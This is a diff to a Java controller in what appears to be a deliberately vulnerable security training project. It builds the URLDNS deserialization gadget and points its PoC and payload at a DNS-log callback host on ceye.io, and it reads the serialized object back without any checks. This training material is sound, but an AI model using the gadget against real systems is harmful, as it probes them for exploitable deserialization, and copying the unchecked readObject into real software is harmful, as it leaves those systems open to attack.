@@ -23,13 +23,14 @@ import java.util.HashMap;
 @RequestMapping("/URLDNS")
 public class URLDNS {
 
-    private static String urlDefault = "http://xxx.dnslog.cn";
+    private static String urlDefault = "http://xxxxxx.ceye.io";
 
     /**
      * 注：这里测试是否能够反序列化弹出dns，确认完全没有限制。
      *
-     * @poc http://127.0.0.1:28888/URLDNS/vul?url=http://123456.baidu.com
-     * @payload url=http://123456.dnslog.cn
+     * @attention （注意）推荐使用 .ceye.io 进行测试，其他dnslog测试平台不好用。 如果第二次测试平台未刷新出来，windows下那就使用 “ipconfig /flushdns” 命令刷新dns缓存！
+     * @poc http://127.0.0.1:28888/URLDNS/vul?url=http://xxxxxx.ceye.io
+     * @payload url=http://xxxxxx.ceye.io
      *
      * @param url
      * @return str
@@ -45,7 +46,8 @@ public class URLDNS {
 
         // 反序列化漏洞测试，执行反序列化。
         try {
-            FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
+            String currentDir = System.getProperty("user.dir") + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\urldnsDeserialize\\";
+            FileInputStream fileInputStream = new FileInputStream(currentDir + "urldns.ser");
             ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
             inputStream.readObject();
             inputStream.close();
@@ -72,7 +74,8 @@ public class URLDNS {
         field.set(url, -1);             // 将hashCode重新设置为-1，确保在反序列化成功触发！
 
         try {
-            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
+            String currentDir = System.getProperty("user.dir") + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\urldnsDeserialize\\";
+            FileOutputStream fileOutputStream = new FileOutputStream(currentDir + "urldns.ser");
             ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
 
             outputStream.writeObject(map);
@@ -98,7 +101,8 @@ public class URLDNS {
         field.set(url, -1);             // 将hashCode重新设置为-1，确保在反序列化成功触发！
 
         try {
-            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
+            String currentDir = System.getProperty("user.dir") + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\urldnsDeserialize\\";
+            FileOutputStream fileOutputStream = new FileOutputStream(currentDir + "urldns.ser");
             ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
 
             outputStream.writeObject(map);
